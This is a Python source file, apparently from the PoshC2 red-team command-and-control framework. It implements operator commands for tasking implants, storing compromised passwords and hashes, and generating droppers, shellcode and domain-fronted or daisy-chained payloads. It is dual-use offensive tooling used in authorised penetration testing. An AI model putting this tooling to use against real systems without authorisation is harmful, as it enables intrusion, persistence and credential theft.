        f"\nURLs: \n{formatted_urls}\nUsers Compromised: \n{users}\nHosts Compromised: \n{hosts}\nPasswords Compromised: \n{creds}\nHashes Compromised: \n{hashes}\nFiles Uploaded: \n{uploads}{Colours.END}")
    input("\nPress Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_list_modules(user, command):
    """
    List all available modules for all implant types.

    Examples:
        list-modules
    """
    modules = os.listdir(ModulesDirectory)
    modules = sorted(modules, key=lambda s: s.lower())

    for module in modules:
        print_good(f"{module}{Colours.END}")

    input("\nPress Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help, name="p")
def do_pwn_self(user, command):
    """
    Obtain a Python2 implant on the C2 server by running the Python2 payload locally.
    TODO: Undo python3 change

    Examples:
        pwn-self
    """
    subprocess.Popen(["python3", f"{PayloadsDirectory}{'py_dropper.py'}"])
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_tasks(user, command):
    """
    Show all queued tasks.

    Examples:
        tasks
    """
    tasks_formatted = ""
    tasks = select_all(NewTask)

    if tasks is None:
        print_bad("No tasks queued at this time!")
        print(Colours.END)
    else:
        for task in tasks:
            implant = get_implant(task.implant_id)

            if implant.numeric_id is not None:
                task_id_str = "0" * (5 - len(str(task.id))) + str(task.id)
                tasks_formatted += f"(Task {task_id_str}) : [{implant.numeric_id}] {task.command}\n"

        print_good(f"Queued tasks:\n\n{tasks_formatted}{Colours.END}")

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_clear_tasks(user, command):
    """
    Clear all pending tasks not yet picked up by implants.

    Examples:
        clear-tasks
    """
    delete_object(NewTask)
    print_good(f"Tasks queue was successfully cleared.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_delete_task(user, command):
    """
    Remove a specific queued task if it has not yet been picked up by the implant.

    If a task ID is not provided then the operator will be prompted.

    Examples:
        delete-task
        delete-task 16
    """
    if command.lower() == "delete-task":
        new_task_id = input("Enter task ID: ")
        print()
    else:
        new_task_id = command.lower().replace("delete-task ", "")

    delete_object(NewTask, {NewTask.id: new_task_id})
    print_good(f"Task has been successfully removed from queue.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_quit(user, command):
    """
    Quit PoshC2

    Examples:
        quit
    """
    ri = input("Are you sure you want to quit? (Y/n) ")

    if ri == "" or ri.lower() == "y":
        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        c2_message = C2Message(
            message=f"\n{Colours.BLUE}{now}: {user} logged off.{Colours.END}\n",
            read="No"
        )

        insert_object(c2_message)
        sys.exit(0)

    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_creds(user, command):
    """
    Manage credentials for use with commands.

    Many commands can take a Cred ID instead of manually entering credentials.

    Examples:
        creds
        creds -add -domain=<domain> -username=<username> -password='<password>'/-hash=<hash>
        creds -search <username>
    """
    if "-add " in command:
        p = re.compile(r"-domain=(\S*)")
        domain = re.search(p, command)

        if domain:
            domain = domain.group(1)

        p = re.compile(r"-username=(\S*)")
        username = re.search(p, command)

        if username:
            username = username.group(1)

        p = re.compile(r"-password=(\S*)")
        password = re.search(p, command)

        if password:
            password = password.group(1)

        p = re.compile(r"-hash=(\S*)")
        hash = re.search(p, command)

        if hash:
            hash = hash.group(1)

        if not domain or not username:
            print_bad("No domain or username specified.")
            print(Colours.END)
            input("Press Enter to continue...")
            clear()
            return

        if password and hash:
            print_bad("Both password and hash specified, only one of them must be provided.")
            print(Colours.END)
            input("Press Enter to continue...")
            clear()
            return

        if not password and not hash:
            print_bad("No password or hash specified.")
            print(Colours.END)
            input("Press Enter to continue...")
            clear()
            return

        if password:
            cred = Cred(
                domain=domain,
                username=username,
                password=password,
                hash=None
            )
        else:
            cred = Cred(
                domain=domain,
                username=username,
                password=None,
                hash=hash
            )

        insert_object(cred)

        if cred.id:
            print_good(f"Credential was added successfully.{Colours.END}\n")

        input("Press Enter to continue...")
        clear()
    elif "-search " in command:
        username = command.replace("creds ", "")
        username = username.replace("-search ", "")
        username = username.strip()
        creds = get_creds(username)

        if creds:
            password_table = Table(title="Passwords Compromised", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
            password_table.add_column("ID", no_wrap=True, justify="center")
            password_table.add_column("Domain", no_wrap=True, justify="center")
            password_table.add_column("Username", no_wrap=True, justify="center")
            password_table.add_column("Password", no_wrap=True, justify="center")
            hash_table = Table(title="Hashes Compromised", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
            hash_table.add_column("ID", no_wrap=True, justify="center")
            hash_table.add_column("Domain", no_wrap=True, justify="center")
            hash_table.add_column("Username", no_wrap=True, justify="center")
            hash_table.add_column("Hash", no_wrap=True, justify="center")

            for cred in creds:
                if cred.password:
                    password_table.add_row(str(cred.id), cred.domain, cred.username, cred.password)
                else:
                    hash_table.add_row(str(cred.id), cred.domain, cred.username, cred.hash)

            console = Console()
            print(Colours.END)
            console.print(password_table)
            print()
            print()
            console.print(hash_table)
            print()

        input("Press Enter to continue...")
        clear()
    else:
        creds = select_all(Cred)

        if creds:
            password_table = Table(title="Passwords Compromised", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
            password_table.add_column("ID", no_wrap=True, justify="center")
            password_table.add_column("Domain", no_wrap=True, justify="center")
            password_table.add_column("Username", no_wrap=True, justify="center")
            password_table.add_column("Password", no_wrap=True, justify="center")

            hash_table = Table(title="Hashes Compromised", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
            hash_table.add_column("ID", no_wrap=True, justify="center")
            hash_table.add_column("Domain", no_wrap=True, justify="center")
            hash_table.add_column("Username", no_wrap=True, justify="center")
            hash_table.add_column("Hash", no_wrap=True, justify="center")

            for cred in creds:
                if cred.password:
                    password_table.add_row(str(cred.id), cred.domain, cred.username, cred.password)
                else:
                    hash_table.add_row(str(cred.id), cred.domain, cred.username, cred.hash)

            console = Console()
            print(Colours.END)
            console.print(password_table)
            print()
            print()
            console.print(hash_table)
            print()

        input("Press Enter to continue...")
        clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_create_daisy_payload(user, command):
    """
    Create a new suite of payloads to be used for Daisy chaining.

    The operator will be prompted for details.

    Examples:
        create-daisy-payload
    """
    new_daisy_payload_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.create-daisy-payload-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
    name = new_daisy_payload_prompt.prompt("Daisy Payload Name (e.g. DC1): ")
    daisy_url = new_daisy_payload_prompt.prompt("Daisy URL (e.g. http://10.0.0.1:8888): ")

    if "http://127.0.0.1" in daisy_url:
        daisy_url = daisy_url.replace("http://127.0.0.1", "http://localhost")

    if "https://127.0.0.1" in daisy_url:
        daisy_url = daisy_url.replace("https://127.0.0.1", "https://localhost")

    daisy_host_implant_id = new_daisy_payload_prompt.prompt("Daisy Host Implant ID (e.g. 5): ")
    daisy_host_implant = get_implant_by_numeric_id(daisy_host_implant_id)
    proxy_none = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
    pbind_secret = PBindSecret
    pbind_pipe_name = PBindPipeName
    fcomm_file_name = FCommFilePath
    daisy_implant_stage_url = f"{get_new_implant_url()}?d"

    url = URL(
        name=name,
        url=daisy_url,
        host_header="",
        proxy_url=None,
        proxy_username=None,
        proxy_password=None,
        credential_expiry=None
    )

    insert_object(url)

    if url.id:
        c2_server = select_first(C2Server)
        new_daisy_payload = Payloads(
            c2_server.kill_date,
            c2_server.encryption_key,
            c2_server.insecure,
            c2_server.user_agent,
            c2_server.referer,
            daisy_implant_stage_url,
            PayloadsDirectory,
            powershell_proxy_command=proxy_none,
            url_id=url.id,
            pbind_pipe_name=pbind_pipe_name,
            pbind_secret=pbind_secret,
            fcomm_file_name=fcomm_file_name
        )

        new_daisy_payload.ps_dropper = new_daisy_payload.ps_dropper.replace(f"$pid;{daisy_url}", f"$pid;{daisy_host_implant.user}@{daisy_host_implant.domain}")
        new_daisy_payload.create_unmanaged_windows(f"{name}_")
        new_daisy_payload.create_droppers(f"{name}_")
        new_daisy_payload.create_shellcode(f"{name}_")
        new_daisy_payload.create_raw(f"{name}_")
        new_daisy_payload.create_donut_shellcode(f"{name}_")
        new_daisy_payload.create_dynamic_payloads(f"{name}_")
        print_good(f"\nNew daisy payloads were created successfully.\n{Colours.END}")

    input("Press Enter to continue...")
    clear()


def create_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
    debug_payloads = False

    if "-debug" in command.lower():
        debug_payloads = True

    if "-credid" in command:
        creds, params = get_cred_from_params(command, user)

        if creds is None:
            return

        if not creds.password:
            print_bad("Hash credential objects are not supported.")
            print(Colours.END)
            input("Press Enter to continue...")
            clear()
            return

    new_payload_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.create-payload-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
    name = new_payload_prompt.prompt("Payload Name (e.g. Scenario_One): ")
    comms_url = new_payload_prompt.prompt("Domain or URL in array format (e.g. https://www.example.com,https://www.example2.com): ")
    domain_front = new_payload_prompt.prompt("Domain front URL in array format (e.g. fjdsklfjdskl.cloudfront.net,jobs.azureedge.net): ")

    comms_url, PayloadCommsHostCount = string_to_array(comms_url)
    domain_front, DomainFrontHeaderCount = string_to_array(domain_front)

    if PayloadCommsHostCount == DomainFrontHeaderCount:
        pass
    else:
        print_bad("\nDifferent number of URLs and host headers.")
        print(Colours.END)
        input(f"Press Enter to continue...")
        clear()
        return

    proxy_url = new_payload_prompt.prompt("Proxy URL (e.g. http://10.150.10.1:8080): ")
    pbind_secret = new_payload_prompt.prompt(f"PBind Secret (e.g {PBindSecret}): ")
    pbind_pipe_name = new_payload_prompt.prompt(f"PBind Pipe Name (e.g. {PBindPipeName}): ")
    fcomm_file_name = new_payload_prompt.prompt(f"FComm File Name (e.g. {FCommFilePath}): ")
    user_agent = new_payload_prompt.prompt(f"User Agent (e.g. {UserAgent}): ")

    if not pbind_secret:
        pbind_secret = PBindSecret

    if not pbind_pipe_name:
        pbind_pipe_name = PBindPipeName

    if not user_agent:
        user_agent = UserAgent

    if not fcomm_file_name:
        fcomm_file_name = FCommFilePath

    proxy_username = ""
    proxy_password = ""
    credential_expiry = ""

    if proxy_url:
        if creds is not None:
            proxy_username = f"{creds.domain}\\{creds.username}"
            proxy_password = creds.password
        else:
            proxy_username = new_payload_prompt.prompt("Proxy User (e.g. Domain\\user): ")
            proxy_password = new_payload_prompt.prompt("Proxy Password (e.g. Password1): ")

        credential_expiry = new_payload_prompt.prompt("Password/Account Expiration Date (e.g. 15/03/2018): ")
        implant_stage_url = f"{get_new_implant_url()}?p"
    else:
        implant_stage_url = get_new_implant_url()

    url = URL(
        name=name,
        url=comms_url,
        host_header=domain_front,
        proxy_url=proxy_url,
        proxy_username=proxy_username,
        proxy_password=proxy_password,
        credential_expiry=credential_expiry
    )

    insert_object(url)

    if url.id:
        c2_server = select_first(C2Server)
        new_payload = Payloads(
            c2_server.kill_date,
            c2_server.encryption_key,
            c2_server.insecure,
            user_agent,
            c2_server.referer,
            implant_stage_url,
            PayloadsDirectory,
            url_id=url.id,
            pbind_pipe_name=pbind_pipe_name,
            pbind_secret=pbind_secret,
            fcomm_file_name=fcomm_file_name
        )

        if shellcode_only:
            new_payload.create_unmanaged_windows(f"{name}_")
            new_payload.create_droppers(f"{name}_", debug_payloads=debug_payloads)
            new_payload.create_shellcode(f"{name}_")
            new_payload.create_donut_shellcode(f"{name}_")
        elif pbind_only:
            new_payload.create_pbind(f"{name}_", debug_payloads=debug_payloads)
        elif linux_only:
            new_payload.create_linux(f"{name}_")
        else:
            new_payload.create_all(f"{name}_", debug_payloads=debug_payloads)

        print_good(f"\nNew payloads were created successfully.{Colours.END}\n")

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_create_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
    """
    Create a full new set of payloads which can have new details such as different comms urls,
    proxy details, PBind pipe names and so on.

    The operator will be prompted for details.

    The -credid option can be passed to use a particular set of credentials.

    The -debug option can be passed to perform a debug build, where supported.

    Examples:
        create-payloads
        create-payloads -credid 6
        create-payloads -debug
    """
    command = command.replace("create-payloads ", "")
    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_create_shellcode(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
    """
    Create a new set of shellcode files which can have new details such as different comms urls,
    proxy details, PBind pipe names and so on.

    The operator will be prompted for details.

    Examples:
        create-shellcode
    """
    command = command.replace("create-shellcode ", "")
    shellcode_only = True
    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_create_pbind_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
    """
    Create a new set of pbind payloads which can have new details.

    The operator will be prompted for details.

    Examples:
        create-pbind-payloads
    """
    command = command.replace("create-pbind-payloads ", "")
    pbind_only = True
    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_create_linux_payloads(user, command, creds=None, shellcode_only=False, pbind_only=False, linux_only=False):
    """
    Create a new set of linux payloads which can have new details.

    The operator will be prompted for details.

    Examples:
        create-linux-payloads
    """
    command = command.replace("create-linux-payloads ", "")
    linux_only = True
    create_payloads(user, command, creds, shellcode_only, pbind_only, linux_only)


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_history(user, command):
    """
    Show the server command history.

    Examples:
        history
    """
    with open(f"{PoshProjectDirectory}.server-history") as history_file:
        for line in history_file:
            if line.startswith("+"):
                print(Colours.GREEN + line.replace("+", "").replace("\n", ""))

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_use(user, command):
    """
    Choose a specific set of implant(s) to use.

    Examples:
        use 1
        use 2-5
        use 3,7,8
        use all
    """
    command = command.replace("use ", "")


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_help(user, command):
    """
    Displays a list of all the available commands for the C2 server, or help for a particular command if specified.

    Examples:
        help
        help opsec
        help set-kill-date
    """
    if command == 'help':
        for command in sorted(server_commands.keys()):
            print_good(f"{command}{Colours.END}")

        print_good(f"\nFor help with a particular command run {Colours.BLUE}help <command>{Colours.END}\n")
    else:
        help_command = command[4:].strip()

        if help_command in server_commands_help:
            if server_commands_help[help_command]:
                print_good(f"    {server_commands_help[help_command].strip()}\n{Colours.END}")
            else:
                print_bad(f"No help available for command: {help_command}")
                print(Colours.END)
        else:
            print_bad(f"Command not recognised: {help_command}")
            print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_searchhelp(user, command):
    """
    Search the server command list for commands containing the keyword.

    The search is case insensitive.

    Examples:
        searchhelp pushover
    """
    searchterm = command.replace("searchhelp ", "")
    found = False

    for line in sorted(server_commands.keys()):
        if searchterm in line.lower():
            if not found:
                found = True

            print_good(f"{line}{Colours.END}")

    if found:
        print()

    input("Press Enter to continue...")
    clear()


def get_opsec_events_string(user, command):
    entries = select_all(OpsecEntry)

    if entries:
        events_formatted = "ID  Date  Owner  Event  Note \n"

        for entry in entries:
            events_formatted += f"{entry.id}  {entry.date}  {entry.owner}  {entry.event}  {entry.note} \n"

        return events_formatted


def generate_opsec(user, command):
    reportname = f"{ReportsDirectory}opsec.txt"
    output_file = open(reportname, 'w')
    output_file.write(get_opsec_string(user, command))
    events_string = get_opsec_events_string(user, command)

    if events_string:
        output_file.write("\nOpSec Events:")
        output_file.write(events_string)

    output_file.close()


def get_opsec_string(user, command):
    implants = select_all(Implant)
    comtasks = select_all(Task)
    urls = select_all(URL)
    users = ""
    hosts = ""
    uploads = ""
    creds = ""
    hashes = ""
    url_formatted = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"

    for url in (urls or []):
        url_formatted += f"{url.id}  {url.name}  {url.url}  {url.host_header}  {url.proxy_url}  {url.proxy_username}  {url.proxy_password}  {url.credential_expiry} \n"

    for implant in (implants or []):
        if implant.hostname not in hosts:
            hosts += f"{implant.hostname} \n"

    for task in (comtasks or []):
        implant = get_implant(task.implant_id)
        command = task.command.lower()
        output = ""

        if task.output:
            output = task.output.lower()

        if implant.user not in users:
            users += f"{implant.domain}\\{implant.user} @ {implant.hostname}\n"

        if "upload-file" in command:
            uploadinfo = command
            uploadinfo = uploadinfo.partition("upload-file ")[2].strip()
            uploads += f"{implant.domain}\\{implant.user} @ {implant.hostname}, {uploadinfo}\n"

        if "installing persistence" in output:
            line = command.replace('\n', '')
            line = line.replace('\r', '')
            filenameuploaded = line.rstrip().split(":", 1)[1]
            uploads += f"{implant.user} {filenameuploaded} \n"

        if "written scf file" in output:
            uploads += f"{implant.user} {output} \n"

        creds, hashes = parse_creds(select_all(Cred))

    return (
        f"\nUsers Compromised: \n{users}\nHosts Compromised: \n{hosts}\nURLs: \n{url_formatted}\nFiles Uploaded: \n{uploads}\nCredentials Compromised: \n{creds}\nHashes Compromised: \n{hashes}")


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_ttps(user, command):
    """
    Show the first occurence of each MITRE TTP automatically extracted from activity.

    Example:
        show-ttps
    """
    ttps = get_mitre_ttps()

    if ttps:
        table = Table(title="MITRE TTPs", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
        table.add_column("Technique ID", no_wrap=True, justify="center")
        table.add_column("Technique Name", no_wrap=True, justify="center")
        table.add_column("Tactics", no_wrap=True, justify="center")
        table.add_column("Task ID", no_wrap=True, justify="center")

        for ttp in ttps:
            table.add_row(ttp.technique_id, ttp.technique_name, ttp.tactics, str(ttp.task_id))

        console = Console()
        print(Colours.END)
        console.print(table)
    else:
        print_bad("No MITRE TTPs were extracted from implant activity.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_ttps_all(user, command):
    """
    Show all MITRE TTPs automatically extracted from activity.

    Example:
        show-ttps-all
    """
    ttps = select_all(MitreTTP)

    if ttps:
        table = Table(title="MITRE TTPs", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
        table.add_column("Technique ID", no_wrap=True, justify="center")
        table.add_column("Technique Name", no_wrap=True, justify="center")
        table.add_column("Tactics", no_wrap=True, justify="center")
        table.add_column("Task ID", no_wrap=True, justify="center")

        for ttp in ttps:
            table.add_row(ttp.technique_id, ttp.technique_name, ttp.tactics, str(ttp.task_id))

        console = Console()
        print(Colours.END)
        console.print(table)
    else:
        print_bad("No MITRE TTPs were extracted from implant activity.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


def main(args):
    signal.signal(signal.SIGINT, catch_exit)
    user = None
    autohide = None

    if len(args) > 0:
        parser = argparse.ArgumentParser(description='The command line for handling implants in PoshC2')
        parser.add_argument('-u', '--user', help='the user for this session')
        parser.add_argument('-a', '--autohide', help='to autohide implants after 30 inactive beacons', action='store_true')
        args = parser.parse_args(args)
        user = args.user
        autohide = args.autohide

    while not user:
        print(Colours.GREEN + "A username is required for logging")
        user = input("Enter your username: ")

    if DatabaseType == "SQLite" and not os.path.isfile(Database.split("sqlite:///")[1]):
        print(Colours.RED + "The project database has not been created yet")
        sys.exit()

    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    c2_message = C2Message(
        message=f"\n{Colours.BLUE}{now}: {user} logged on.{Colours.END}\n",
        read="No"
    )

    insert_object(c2_message)
    clear()
    implant_handler_command_loop(user, "", autohide)


if __name__ == '__main__':
    args = sys.argv
    main(args)
